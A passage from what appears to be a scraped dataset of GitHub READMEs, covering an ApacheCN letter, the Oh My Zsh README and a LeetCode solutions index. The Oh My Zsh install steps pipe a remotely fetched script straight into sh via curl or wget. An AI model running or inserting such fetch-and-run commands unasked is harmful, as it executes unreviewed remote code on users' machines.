\u3011\n\u8bf4\u5b9e\u8bdd\uff0c\u6536\u5230\u4f60\u7684\u6d88\u606f\uff0c\u6211\u4eec\u5185\u90e8\u8fd8\u662f\u6bd4\u8f83\u80fd\u7406\u89e3\u548c\u63a5\u53d7\u7684\uff0c\u6211\u4eec\u4e5f\u662f\u975e\u5e38\u5c0a\u91cd\u7248\u6743\u548c\u77e5\u8bc6\u5206\u4eab\u3002\n\u56e0\u4e3a\u6211\u4eec\u7ec4\u7ec7\u662f\u4e13\u6ce8\u4e0eAI\u9886\u57df\u7684\u4eba\u3010\u7b97\u662f\u56fd\u5185\u7b2c\u4e00\u4e2a\u6709\u89c4\u6a21\u6027\u7684AI \u5f00\u6e90\u7ec4\u7ec7\uff1f\uff1f\u3011 \u90fd\u662f\u90a3\u79cd\u4e50\u4e8e\u8d21\u732e\u7684\uff0c\u6240\u4ee5\u5728\u7ffb\u8bd1\u7684\u8fed\u4ee3\u901f\u5ea6\u548c\u8d28\u91cf\u4e0a\u4e00\u5b9a\u662f\u6bd4\u522b\u4eba\u597d\u4e00\u70b9\u7684\u3002\n\n\u6211\u4eec\u7684\u9996\u9875\uff1a http:\/\/www.apachecn.org \n\n\u6211\u4eec\u662f\u4e00\u4e2a\u5927\u578b\u5f00\u6e90\u793e\u533a\uff0c\u65d7\u4e0b QQ \u7fa4\u5171 9000 \u4f59\u4eba\uff0cGithub Star \u6570\u91cf\u8d85\u8fc7 20k \u4e2a\uff0c\u5728\u6240\u6709 Github \u7ec4\u7ec7\u4e2d\u6392\u540d 110\uff0c\u7f51\u7ad9\u65e5 uip \u8d85\u8fc7 4k\uff0c\u62e5\u6709 CSDN \u535a\u5ba2\u4e13\u5bb6\u548c\u7b80\u4e66\u7a0b\u5e8f\u5458\u4f18\u79c0\u4f5c\u8005\u8ba4\u8bc1\u3002\u6211\u4eec\u7ec4\u7ec7\u516c\u76ca\u6027\u7684\u7ffb\u8bd1\u6d3b\u52a8\u3001\u5b66\u4e60\u6d3b\u52a8\u548c\u6bd4\u8d5b\u7ec4\u961f\u6d3b\u52a8\uff0c\u5e76\u548c DataWhale\u3001LinuxStory \u7b49\u56fd\u5185\u8457\u540d\u5f00\u6e90\u7ec4\u7ec7\u4fdd\u6301\u826f\u597d\u7684\u5408\u4f5c\u5173\u7cfb\u3002\n\u4f5c\u4e3a\u516c\u76ca\u7ec4\u7ec7\uff0c\u6211\u4eec\u5c06\u5b8c\u6210\u9879\u76ee\u653e\u5728\u9996\u8981\u4f4d\u7f6e\uff0c\u5e76\u6709\u8db3\u591f\u65f6\u95f4\u628a\u9879\u76ee\u6253\u78e8\u5230\u6781\u81f4\u3002\u6211\u4eec\u5e0c\u671b\u505a\u51fa\u5e7f\u5927 AI \u7231\u597d\u8005\u771f\u6b63\u9700\u8981\u7684\u4e1c\u897f\uff0c\u6253\u9020\u771f\u6b63\u6709\u4ef7\u503c\u7684\u957f\u5c3e\u4f5c\u54c1\u3002\n\n\u4e0d\u4ec5\u4ec5\u53ef\u4ee5\u5e2e\u5fd9\u7ffb\u8bd1\u3001\u8fd8\u53ef\u4ee5\u5e2e\u5fd9\u5bf9\u4e66\u7c4d\u7684\u5ba3\u4f20\u3002\n\u6211\u4eec\u7ec4\u7ec7\u5bf9 O'Reilly \u7684\u4e66\u7c4d\u8ba4\u53ef\u5ea6\u5f88\u9ad8\uff0c\u975e\u5e38\u671f\u5f85\u80fd\u4e0e\u8d35\u516c\u53f8\u6709\u5408\u4f5c\u7684\u673a\u4f1a\u3002\n\n\u795d\u597d\uff01\nApacheCN \u8d1f\u8d23\u4eba - \u7247\u523b\n```\n\n--- \n\n* [ApacheCN](http:\/\/www.apachecn.org) \u63d0\u793a: \u6587\u5b57\u7248\u672c\u8bf7\u81ea\u884c\u767e\u5ea6\u641c\u7d22\n* \u3010\u671f\u5f85\u5927\u5bb6\u80fd\u63d0\u4f9b\u66f4\u591a\u7684\u4e66\u7c4d\u5408\u4f5c\u5546\uff0c\u6211\u4eec\u4e00\u8d77\u505a\u66f4\u6709\u610f\u4e49\u7684\u7ffb\u8bd1\u4e8b\u60c5\u3011\n"},{"repo":"\/ohmyzsh\/ohmyzsh","language":"Shell","readme_contents":"<p align=\"center\">\n  <img src=\"https:\/\/s3.amazonaws.com\/ohmyzsh\/oh-my-zsh-logo.png\" alt=\"Oh My Zsh\">\n<\/p>\n\n[![Discord server](https:\/\/img.shields.io\/discord\/642496866407284746)](https:\/\/discord.gg\/bpXWhnN)\n[![Follow @ohmyzsh](https:\/\/img.shields.io\/twitter\/follow\/ohmyzsh?label=Follow+@ohmyzsh&style=flat)](https:\/\/twitter.com\/intent\/follow?screen_name=ohmyzsh)\n\nOh My Zsh is an open source, community-driven framework for managing your [zsh](https:\/\/www.zsh.org\/) configuration.\n\nSounds boring. Let's try again.\n\n__Oh My Zsh will not make you a 10x developer...but you may feel like one.__\n\nOnce installed, your terminal shell will become the talk of the town _or your money back!_ With each keystroke in your command prompt, you'll take advantage of the hundreds of powerful plugins and beautiful themes. Strangers will come up to you in caf\u00e9s and ask you, _\"that is amazing! are you some sort of genius?\"_\n\nFinally, you'll begin to get the sort of attention that you have always felt you deserved. ...or maybe you'll use the time that you're saving to start flossing more often. \ud83d\ude2c\n\nTo learn more, visit [ohmyz.sh](https:\/\/ohmyz.sh) and follow [@ohmyzsh](https:\/\/twitter.com\/ohmyzsh) on Twitter.\n\n## Getting Started\n\n### Prerequisites\n\n* A Unix-like operating system: macOS, Linux, BSD. On Windows: WSL is preferred, but cygwin or msys also mostly work.\n* [Zsh](https:\/\/www.zsh.org) should be installed (v4.3.9 or more recent). If not pre-installed (run `zsh --version` to confirm), check the following instructions here: [Installing ZSH](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Installing-ZSH)\n* `curl` or `wget` should be installed\n* `git` should be installed\n\n### Basic Installation\n\nOh My Zsh is installed by running one of the following commands in your terminal. You can install this via the command-line with either `curl` or `wget`.\n\n#### via curl\n\n```shell\nsh -c \"$(curl -fsSL https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh)\"\n```\n\n#### via wget\n\n```shell\nsh -c \"$(wget -O- https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh)\"\n```\n\n#### Manual inspection\n\nIt's a good idea to inspect the install script from projects you don't yet know. You can do\nthat by downloading the install script first, looking through it so everything looks normal,\nthen running it:\n\n```shell\ncurl -Lo install.sh https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh\nsh install.sh\n```\n\n## Using Oh My Zsh\n\n### Plugins\n\nOh My Zsh comes with a shitload of plugins to take advantage of. You can take a look in the [plugins](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/tree\/master\/plugins) directory and\/or the [wiki](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Plugins) to see what's currently available.\n\n#### Enabling Plugins\n\nOnce you spot a plugin (or several) that you'd like to use with Oh My Zsh, you'll need to enable them in the `.zshrc` file. You'll find the zshrc file in your `$HOME` directory. Open it with your favorite text editor and you'll see a spot to list all the plugins you want to load.\n\n```shell\nvi ~\/.zshrc\n```\n\nFor example, this might begin to look like this:\n\n```shell\nplugins=(\n  git\n  bundler\n  dotenv\n  osx\n  rake\n  rbenv\n  ruby\n)\n```\n\n_Note that the plugins are separated by whitespace. **Do not** use commas between them._\n\n#### Using Plugins\n\nMost plugins (should! we're working on this) include a __README__, which documents how to use them.\n\n### Themes\n\nWe'll admit it. Early in the Oh My Zsh world, we may have gotten a bit too theme happy. We have over one hundred themes now bundled. Most of them have [screenshots](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Themes) on the wiki. Check them out!\n\n#### Selecting a Theme\n\n_Robby's theme is the default one. It's not the fanciest one. It's not the simplest one. It's just the right one (for him)._\n\nOnce you find a theme that you'd like to use, you will need to edit the `~\/.zshrc` file. You'll see an environment variable (all caps) in there that looks like:\n\n```shell\nZSH_THEME=\"robbyrussell\"\n```\n\nTo use a different theme, simply change the value to match the name of your desired theme. For example:\n\n```shell\nZSH_THEME=\"agnoster\" # (this is one of the fancy ones)\n# see https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Themes#agnoster\n```\n\n_Note: many themes require installing the [Powerline Fonts](https:\/\/github.com\/powerline\/fonts) in order to render properly._\n\nOpen up a new terminal window and your prompt should look something like this:\n\n![Agnoster theme](https:\/\/cloud.githubusercontent.com\/assets\/2618447\/6316862\/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png)\n\nIn case you did not find a suitable theme for your needs, please have a look at the wiki for [more of them](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/External-themes).\n\nIf you're feeling feisty, you can let the computer select one randomly for you each time you open a new terminal window.\n\n\n```shell\nZSH_THEME=\"random\" # (...please let it be pie... please be some pie..)\n```\n\nAnd if you want to pick random theme from a list of your favorite themes:\n\n```shell\nZSH_THEME_RANDOM_CANDIDATES=(\n  \"robbyrussell\"\n  \"agnoster\"\n)\n```\n\n### FAQ\n\nIf you have some more questions or issues, you might find a solution in our [FAQ](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/FAQ).\n\n## Advanced Topics\n\nIf you're the type that likes to get their hands dirty, these sections might resonate.\n\n### Advanced Installation\n\nSome users may want to manually install Oh My Zsh, or change the default path or other settings that\nthe installer accepts (these settings are also documented at the top of the install script).\n\n#### Custom Directory\n\nThe default location is `~\/.oh-my-zsh` (hidden in your home directory)\n\nIf you'd like to change the install directory with the `ZSH` environment variable, either by running\n`export ZSH=\/your\/path` before installing, or by setting it before the end of the install pipeline\nlike this:\n\n```shell\nZSH=\"$HOME\/.dotfiles\/oh-my-zsh\" sh install.sh\n```\n\n#### Unattended install\n\nIf you're running the Oh My Zsh install script as part of an automated install, you can pass the\nflag `--unattended` to the `install.sh` script. This will have the effect of not trying to change\nthe default shell, and also won't run `zsh` when the installation has finished.\n\n```shell\nsh -c \"$(curl -fsSL https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh)\" \"\" --unattended\n```\n\n#### Installing from a forked repository\n\nThe install script also accepts these variables to allow installation of a different repository:\n\n- `REPO` (default: `ohmyzsh\/ohmyzsh`): this takes the form of `owner\/repository`. If you set\n  this variable, the installer will look for a repository at `https:\/\/github.com\/{owner}\/{repository}`.\n\n- `REMOTE` (default: `https:\/\/github.com\/${REPO}.git`): this is the full URL of the git repository\n  clone. You can use this setting if you want to install from a fork that is not on GitHub (GitLab,\n  Bitbucket...) or if you want to clone with SSH instead of HTTPS (`git@github.com:user\/project.git`).\n\n  _NOTE: it's incompatible with setting the `REPO` variable. This setting will take precedence._\n\n- `BRANCH` (default: `master`): you can use this setting if you want to change the default branch to be\n  checked out when cloning the repository. This might be useful for testing a Pull Request, or if you\n  want to use a branch other than `master`.\n\nFor example:\n\n```shell\nREPO=apjanke\/oh-my-zsh BRANCH=edge sh install.sh\n```\n\n#### Manual Installation\n\n##### 1. Clone the repository:\n\n```shell\ngit clone https:\/\/github.com\/ohmyzsh\/ohmyzsh.git ~\/.oh-my-zsh\n```\n\n##### 2. *Optionally*, backup your existing `~\/.zshrc` file:\n\n```shell\ncp ~\/.zshrc ~\/.zshrc.orig\n```\n\n##### 3. Create a new zsh configuration file\n\nYou can create a new zsh config file by copying the template that we have included for you.\n\n```shell\ncp ~\/.oh-my-zsh\/templates\/zshrc.zsh-template ~\/.zshrc\n```\n\n##### 4. Change your default shell\n\n```shell\nchsh -s $(which zsh)\n```\n\nYou must log out from your user session and log back in to see this change.\n\n##### 5. Initialize your new zsh configuration\n\nOnce you open up a new terminal window, it should load zsh with Oh My Zsh's configuration.\n\n### Installation Problems\n\nIf you have any hiccups installing, here are a few common fixes.\n\n* You _might_ need to modify your `PATH` in `~\/.zshrc` if you're not able to find some commands after\nswitching to `oh-my-zsh`.\n* If you installed manually or changed the install location, check the `ZSH` environment variable in\n`~\/.zshrc`.\n\n### Custom Plugins and Themes\n\nIf you want to override any of the default behaviors, just add a new file (ending in `.zsh`) in the `custom\/` directory.\n\nIf you have many functions that go well together, you can put them as a `XYZ.plugin.zsh` file in the `custom\/plugins\/` directory and then enable this plugin.\n\nIf you would like to override the functionality of a plugin distributed with Oh My Zsh, create a plugin of the same name in the `custom\/plugins\/` directory and it will be loaded instead of the one in `plugins\/`.\n\n## Getting Updates\n\nBy default, you will be prompted to check for upgrades every few weeks. If you would like `oh-my-zsh` to automatically upgrade itself without prompting you, set the following in your `~\/.zshrc`:\n\n```shell\nDISABLE_UPDATE_PROMPT=true\n```\n\nTo disable automatic upgrades, set the following in your `~\/.zshrc`:\n\n```shell\nDISABLE_AUTO_UPDATE=true\n```\n\n### Manual Updates\n\nIf you'd like to upgrade at any point in time (maybe someone just released a new plugin and you don't want to wait a week?) you just need to run:\n\n```shell\nupgrade_oh_my_zsh\n```\n\nMagic! \ud83c\udf89\n\n## Uninstalling Oh My Zsh\n\nOh My Zsh isn't for everyone. We'll miss you, but we want to make this an easy breakup.\n\nIf you want to uninstall `oh-my-zsh`, just run `uninstall_oh_my_zsh` from the command-line. It will remove itself and revert your previous `bash` or `zsh` configuration.\n\n## How do I contribute to Oh My Zsh?\n\nBefore you participate in our delightful community, please read the [code of conduct](CODE_OF_CONDUCT.md).\n\nI'm far from being a [Zsh](https:\/\/www.zsh.org\/) expert and suspect there are many ways to improve \u2013 if you have ideas on how to make the configuration easier to maintain (and faster), don't hesitate to fork and send pull requests!\n\nWe also need people to test out pull-requests. So take a look through [the open issues](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/issues) and help where you can.\n\nSee [Contributing](CONTRIBUTING.md) for more details.\n\n### Do NOT send us themes\n\nWe have (more than) enough themes for the time being. Please add your theme to the [external themes](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/External-themes) wiki page.\n\n## Contributors\n\nOh My Zsh has a vibrant community of happy users and delightful contributors. Without all the time and help from our contributors, it wouldn't be so awesome.\n\nThank you so much!\n\n## Follow Us\n\nWe're on the social media.\n\n* [@ohmyzsh](https:\/\/twitter.com\/ohmyzsh) on Twitter. You should follow it.\n* [Oh My Zsh](https:\/\/www.facebook.com\/Oh-My-Zsh-296616263819290\/) on Facebook.\n\n## Merchandise\n\nWe have [stickers, shirts, and coffee mugs available](https:\/\/shop.planetargon.com\/collections\/oh-my-zsh?utm_source=github) for you to show off your love of Oh My Zsh. Again, you will become the talk of the town!\n\n## License\n\nOh My Zsh is released under the [MIT license](LICENSE.txt).\n\n## About Planet Argon\n\n![Planet Argon](https:\/\/pa-github-assets.s3.amazonaws.com\/PARGON_logo_digital_COL-small.jpg)\n\nOh My Zsh was started by the team at [Planet Argon](https:\/\/www.planetargon.com\/?utm_source=github), a [Ruby on Rails development agency](https:\/\/www.planetargon.com\/skills\/ruby-on-rails-development?utm_source=github). Check out our [other open source projects](https:\/\/www.planetargon.com\/open-source?utm_source=github).\n"},{"repo":"\/azl397985856\/leetcode","language":"JavaScript","readme_contents":"# LeetCode\n[![Travis](https:\/\/img.shields.io\/badge\/language-C++-green.svg)]()\n[![Travis](https:\/\/img.shields.io\/badge\/language-JavaScript-yellow.svg)]()\n[![Travis](https:\/\/img.shields.io\/badge\/language-Python-red.svg)]()\n[![Travis](https:\/\/img.shields.io\/badge\/language-Java-blue.svg)]()\n![Total visitor](https:\/\/visitor-count-badge.herokuapp.com\/total.svg?repo_id=azl397985856.leetcode)\n![Visitors in today](https:\/\/visitor-count-badge.herokuapp.com\/today.svg?repo_id=azl397985856.leetcode)\n> since 2019-09-03 19:40\n\n[\u7b80\u4f53\u4e2d\u6587](.\/README.md) | English\n\n---\n\n![leetcode.jpeg](.\/assets\/leetcode.jpeg)\n\nThis essay records the course of and my emotion to this project from initialisation to 10,000 stars.\n[Milestone for 10,000+ stars](.\/thanksGiving.md)\n\nIf you are interested in this project, **do not mean your star**. This project will be **supported for a long enough time** by the comminity. Thanks for every audience and contributor.\n\n## Introduction\n\n![leetcode.jpeg](.\/assets\/leetcode.jpeg)\n\nLeetCode Solutions: A Journey of Problem Solving.\n\nThis repository is divided into five parts for now:\n\n- The first part is the solutions to some classic problems on LeetCode, including the idea thinkings, key points and code implementations.\n\n- The second part is a summary of data structures and algorithms.\n\n- The third part is [Anki flashcards](https:\/\/apps.ankiweb.net) that organizes the LeetCode problems in a certain way to make it easier to remember.\n\n- The fourth part is daily challenges which were held at group chat. We usually solve one problem altogether to get more feedback. Moreover, the problems can be drafted to add to the problem solving module.\n\n- The fifth part is a future plannning on content that will be introduced into the above parts.\n\n> Only when having mastered the basic data structures and algorithms can you solve complex problems easily.\n\n## About me\n\nI, a programmer, am all passionate about technology.\n\nUsed to write `.net` and `Java`, I am a frontend engineer and focused on the engineering, optimization and standardlization for frontend.\n\nIf you want to do some contributions or collaborations, just feel free to contact me via [azl397985856@gmail.com].\n\n## Usage Instructions\n\n- For the parts that were added recently, there will be a \ud83c\udd95 behind.\n- For the parts that were updated recently, there will be a \ud83d\udd8a behind.\n- Here will be the place to update Anki Flashcards in the future as well.\n- Here is a mind mapping graph showing the summary of categorizations of problems that are questioned frequently in interviews. We could analyze according to the information in the graph.\n\n![leetcode-zhihu](.\/assets\/\/leetcode-zhihu.jpg)\n\n(Picture credited by [LeetCode-cn](https:\/\/www.zhihu.com\/question\/24964987\/answer\/586425979).)\n\nThe algorithms mainly includes:\n\n- Basic skills: Divide-and-Conquer; Binary; Greedy\n- Sorting algorithms: Quicksort; Merge Sort; Counting Sort\n- Searching algorithms: Backtracking; Recursion; Depth-First-Search (DFS); Breath-First-Search (BFS); Binary Search Tree; etc.\n- Graph theory: Shortest Path Problem; Minimal Spanning Tree\n- Dynamic Programming: Knapsack Problem; Longest Common Subsequence (LCS) Problem\n\nThe data structures mainly includes:\n\n- Array and linked list: Singly\/Doubly-Linked List\n- Stack and queue\n- Hash table\n- Heap: Min-Max Heap\n- Tree and Graph: Lowest Common Ancestor (LCA); Disjoint-Set\n- String: Prefix Tree (Trie); Suffix Tree\n\n\n\n## Previews\n\n[0042.trapping-rain-water](.\/problems\/42.trapping-rain-water.md):\n\n![0042.trapping-rain-water](.\/assets\/problems\/42.trapping-rain-water-1.png)\n\n[0547.friend-circles](.\/problems\/547.friend-circles-en.md):\n\n![friend circle BFS](.\/assets\/problems\/547.friend-circle-bfs.png)\n\n[backtrack problems](.\/problems\/90.subsets-ii.md):\n\n![backtrack](.\/assets\/problems\/backtrack.png)\n\n[0198.house-robber](.\/problems\/198.house-robber.md):\n\n![198.house-robber](.\/assets\/problems\/198.house-robber.png)\n\n[0454.4-sum-ii](.\/problems\/454.4-sum-ii.md):\n\n![454.4-sum-ii](.\/assets\/problems\/454.4-sum-ii.png)\n\n\n\n## Top Problems Progress\n\n- [Top 100 Liked Questions](https:\/\/leetcode.com\/problemset\/top-100-liked-questions\/) (79 \/ 100)\n\n- [Top Interview Questions](https:\/\/leetcode.com\/problemset\/top-interview-questions\/) (97 \/ 145)\n\n## Portals\n\n### Solutions to LeetCode Classic Problems\n\n> Here only lists some **representative problems** but not all.\n\n#### Easy\n\n- [0020.Valid Parentheses](.\/problems\/20.validParentheses.md)\n- [0026.remove-duplicates-from-sorted-array](.\/problems\/26.remove-duplicates-from-sorted-array.md)\n- [0053.maximum-sum-subarray](.\/problems\/53.maximum-sum-subarray-en.md) \ud83c\udd95\n- [0088.merge-sorted-array](.\/problems\/88.merge-sorted-array.md)\n- [0104.maximum-depth-of-binary-tree](.\/problems\/104.maximum-depth-of-binary-tree.md)\n- [0121.best-time-to-buy-and-sell-stock](.\/problems\/121.best-time-to-buy-and-sell-stock.md)\n- [0122.best-time-to-buy-and-sell-stock-ii](.\/problems\/122.best-time-to-buy-and-sell-stock-ii.md)\n- [0125.valid-palindrome](.\/problems\/125.valid-palindrome.md) \ud83c\udd95\n- [0136.single-number](.\/problems\/136.single-number.md)\n- [0155.min-stack](.\/problems\/155.min-stack.md) \ud83c\udd95\n- [0167.two-sum-ii-input-array-is-sorted](.\/problems\/167.two-sum-ii-input-array-is-sorted.md)\n- [0172.factorial-trailing-zeroes](.\/problems\/172.factorial-trailing-zeroes.md)\n- [0169.majority-element](.\/problems\/169.majority-element.md)\n- [0190.reverse-bits](.\/problems\/190.reverse-bits.md)\n- [0191.number-of-1-bits](.\/problems\/191.number-of-1-bits.md)\n- [0198.house-robber](.\/problems\/198.house-robber.md)\n- [0203.remove-linked-list-elements](.\/problems\/203.remove-linked-list-elements.md)\n- [0206.reverse-linked-list](.\/problems\/206.reverse-linked-list.md)\n- [0219.contains-duplicate-ii](.\/problems\/219.contains-duplicate-ii.md)\n- [0226.invert-binary-tree](.\/problems\/226.invert-binary-tree.md)\n- [0232.implement-queue-using-stacks](.\/problems\/232.implement-queue-using-stacks.md) \ud83c\udd95\n- [0263.ugly-number](.\/problems\/263.ugly-number.md)\n- [0283.move-zeroes](.\/problems\/283.move-zeroes.md)\n- [0342.power-of-four](.\/problems\/342.power-of-four.md)\n- [0349.intersection-of-two-arrays](.\/problems\/349.intersection-of-two-arrays.md)\n- [0437.path-sum-iii](.\/problems\/437.path-sum-iii.md) \ud83c\udd95\n- [0371.sum-of-two-integers](.\/problems\/371.sum-of-two-integers.md)\n- [0575.distribute-candies](.\/problems\/575.distribute-candies.md)\n\n\n#### Medium\n\n- [0002. Add Two Numbers](.\/problems\/2.addTwoNumbers.md)\n- [0003. Longest Substring Without Repeating Characters](.\/problems\/3.longestSubstringWithoutRepeatingCharacters.md)\n- [0005.longest-palindromic-substring](.\/problems\/5.longest-palindromic-substring.md)\n- [0011.container-with-most-water](.\/problems\/11.container-with-most-water.md)\n- [0015.3-sum](.\/problems\/15.3-sum.md)\n- [0019. Remove Nth Node From End of List](.\/problems\/19.removeNthNodeFromEndofList.md)\n- [0024. Swap Nodes In Pairs](.\/problems\/24.swapNodesInPairs.md)\n- [0029.divide-two-integers](.\/problems\/29.divide-two-integers.md)\n- [0031.next-permutation](.\/problems\/31.next-permutation.md)\n- [0033.search-in-rotated-sorted-array](.\/problems\/33.search-in-rotated-sorted-array.md) \n- [0039.combination-sum](.\/problems\/39.combination-sum.md)\n- [0040.combination-sum-ii](.\/problems\/40.combination-sum-ii.md)\n- [0046.permutations](.\/problems\/46.permutations.md)\n- [0047.permutations-ii](.\/problems\/47.permutations-ii.md)\n- [0048.rotate-image](.\/problems\/48.rotate-image.md)\n- [0049.group-anagrams](.\/problems\/49.group-anagrams.md)\n- [0055.jump-game](.\/problems\/55.jump-game.md)\n- [0056.merge-intervals](.\/problems\/56.merge-intervals.md)\n- [0062.unique-paths](.\/problems\/62.unique-paths.md )\n- [0073.set-matrix-zeroes](.\/problems\/73.set-matrix-zeroes.md )\n- [0075.sort-colors](.\/problems\/75.sort-colors.md)\n- [0078.subsets](.\/problems\/78.subsets.md)\n- [0079.word-search](.\/problems\/79.word-search-en.md)\n- [0086.partition-list](.\/problems\/86.partition-list.md)\n- [0090.subsets-ii](.\/problems\/90.subsets-ii.md)\n- [0091.decode-ways](.\/problems\/91.decode-ways.md)\n- [0092.reverse-linked-list-ii](.\/problems\/92.reverse-linked-list-ii.md)\n- [0094.binary-tree-inorder-traversal](.\/problems\/94.binary-tree-inorder-traversal.md)\n- [0098.validate-binary-search-tree](.\/problems\/98.validate-binary-search-tree.md)  \n- [0102.binary-tree-level-order-traversal](.\/problems\/102.binary-tree-level-order-traversal.md)\n- [0103.binary-tree-zigzag-level-order-traversal](.\/problems\/103.binary-tree-zigzag-level-order-traversal.md)\n- [0113.path-sum-ii](.\/problems\/113.path-sum-ii.md)\n- [0129.sum-root-to-leaf-numbers](.\/problems\/129.sum-root-to-leaf-numbers.md) \n- [0130.surrounded-regions](.\/problems\/130.surrounded-regions.md) \n- [0131.palindrome-partitioning](.\/problems\/131.palindrome-partitioning.md)\n- [0139.word-break](.\/problems\/139.word-break.md)\n- [0144.binary-tree-preorder-traversal](.\/problems\/144.binary-tree-preorder-traversal.md)\n- [0150.evaluate-reverse-polish-notation](.\/problems\/150.evaluate-reverse-polish-notation.md)\n- [0152.maximum-product-subarray](.\/problems\/152.maximum-product-subarray.md)\n- [0199.binary-tree-right-side-view](.\/problems\/199.binary-tree-right-side-view.md)\n- [0200.number-of-islands](.\/problems\/200.number-of-islands.md) \ud83c\udd95\n- [0201.bitwise-and-of-numbers-range](.\/problems\/201.bitwise-and-of-numbers-range.md)\n- [0208.implement-trie-prefix-tree](.\/problems\/208.implement-trie-prefix-tree.md)\n- [0209.minimum-size-subarray-sum](.\/problems\/209.minimum-size-subarray-sum.md)\n- [0215.kth-largest-element-in-an-array](.\/problems\/215.kth-largest-element-in-an-array.md) \ud83c\udd95 \n- [0221.maximal-square](.\/problems\/221.maximal-square.md) \n- [0229.majority-element-ii](.\/problems\/229.majority-element-ii.md) \ud83c\udd95 \n- [0230.kth-smallest-element-in-a-bst](.\/problems\/230.kth-smallest-element-in-a-bst.md)\n- [0236.lowest-common-ancestor-of-a-binary-tree](.\/problems\/236.lowest-common-ancestor-of-a-binary-tree.md)\n- [0238.product-of-array-except-self](.\/problems\/238.product-of-array-except-self.md)\n- [0240.search-a-2-d-matrix-ii](.\/problems\/240.search-a-2-d-matrix-ii.md)\n- [0279.perfect-squares](.\/problems\/279.perfect-squares.md)\n- [0309.best-time-to-buy-and-sell-stock-with-cooldown](.\/problems\/309.best-time-to-buy-and-sell-stock-with-cooldown.md) \n- [0322.coin-change](.\/problems\/322.coin-change.md)\n- [0328.odd-even-linked-list](.\/problems\/328.odd-even-linked-list.md)\n- [0334.increasing-triplet-subsequence](.\/problems\/334.increasing-triplet-subsequence.md)\n- [0365.water-and-jug-problem](.\/problems\/365.water-and-jug-problem.md)\n- [0378.kth-smallest-element-in-a-sorted-matrix](.\/problems\/378.kth-smallest-element-in-a-sorted-matrix.md) \n- [0416.partition-equal-subset-sum](.\/problems\/416.partition-equal-subset-sum.md)\n- [0445.add-two-numbers-ii](.\/problems\/445.add-two-numbers-ii.md)\n- [0454.4-sum-ii](.\/problems\/454.4-sum-ii.md)\n- [0474.ones-and-zeros](.\/problems\/474.ones-and-zeros-en.md)\n- [0494.target-sum](.\/problems\/494.target-sum.md)\n- [0516.longest-palindromic-subsequence](.\/problems\/516.longest-palindromic-subsequence.md)\n- [0518.coin-change-2](.\/problems\/518.coin-change-2.md)\n- [0547.friend-circles](.\/problems\/547.friend-circles-en.md) \ud83c\udd95\n- [0609.find-duplicate-file-in-system](.\/problems\/609.find-duplicate-file-in-system.md)\n- [0875.koko-eating-bananas](.\/problems\/875.koko-eating-bananas.md)\n- [0877.stone-game](.\/problems\/877.stone-game.md)\n- [0887.super-egg-drop](.\/problems\/887.super-egg-drop.md)\n- [0900.rle-iterator](.\/problems\/900.rle-iterator.md)\n- [0912.sort-an-array](.\/problems\/912.sort-an-array.md) \ud83c\udd95\n- [1031.maximum-sum-of-two-non-overlapping-subarrays](.\/problems\/1031.maximum-sum-of-two-non-overlapping-subarrays.md)\n- [1218.longest-arithmetic-subsequence-of-given-difference.md](.\/problems\/1218.longest-arithmetic-subsequence-of-given-difference.md) \ud83c\udd95\n\n#### Hard\n\n- [0004.median-of-two-sorted-array](.\/problems\/4.median-of-two-sorted-array.md) \ud83c\udd95\n- [0023.merge-k-sorted-lists](.\/problems\/23.merge-k-sorted-lists.md)\n- [0025.reverse-nodes-in-k-group](.\/problems\/25.reverse-nodes-in-k-groups-en.md) \ud83c\udd95\n- [0032.longest-valid-parentheses](.\/problems\/32.longest-valid-parentheses.md) \ud83c\udd95\n- [0042.trapping-rain-water](.\/problems\/42.trapping-rain-water.md)\n- [0124.binary-tree-maximum-path-sum](.\/problems\/124.binary-tree-maximum-path-sum.md)\n- [0128.longest-consecutive-sequence](.\/problems\/128.longest-consecutive-sequence.md)\n- [0145.binary-tree-postorder-traversal](.\/problems\/145.binary-tree-postorder-traversal.md)\n- [0146.lru-cache](.\/problems\/146.lru-cache.md)\n- [0239.sliding-window-maximum](.\/problems\/239.sliding-window-maximum.md)\n- [0295.find-median-from-data-stream](.\/problems\/295.find-median-from-data-stream.md) \ud83c\udd95\n- [0301.remove-invalid-parentheses](.\/problems\/301.remove-invalid-parentheses.md)\n- [0460.lfu-cache](.\/problems\/460.lfu-cache.md) \ud83c\udd95\n- [1168.optimize-water-distribution-in-a-village](.\/problems\/1168.optimize-water-distribution-in-a-village-en.md) \ud83c\udd95\n\n\n\n\n### Summary of Data Structures and Algorithms\n\n- [Data Structure](.\/thinkings\/basic-data-structure-en.md) (Drafts)\n- [Basic Algorithm](.\/thinkings\/basic-algorithm-en.md)Drafts\n- [Binary Tree Traversal](.\/thinkings\/binary-tree-traversal-en.md)\n- [Dynamic Programming](.\/thinkings\/dynamic-programming-en.md)\n- [Huffman Encode and Run Length Encode](.\/thinkings\/run-length-encode-and-huffman-encode-en.md)\n- [Bloom Filter](.\/thinkings\/bloom-filter-en.md)\n- [String Problems](.\/thinkings\/string-problems-en.md)\n\n\n\n### Anki Flashcards\n\nAnki falshcards would be mainly two parts: the mappings from key points to problems; the mappings from problems to idea thinks, key points and code implementations.\n\nAll flashcards are put in [anki-card](.\/assets\/anki\/leetcode.apkg).\n\n> Please check [here](https:\/\/apps.ankiweb.net\/) for more about the usage of Anki.\n\nLatest updated flashcards (only lists the front page):\n\n- What is the key point of the binary search algorithm? Related problems?\n- How to simplify the operations using the features of stacks? Related problems?\n- The thinkings and related problems of double-pointers problems?\n- The thinkings and related problems of sliding window problems?\n- The thinkings and related problems of backtracking?\n- The thinkings and related problems of number theory?\n- The thinkings and related problems of bit operations?\n\n> WIP: the translation of the flashcards are on the way.\n\n> problems 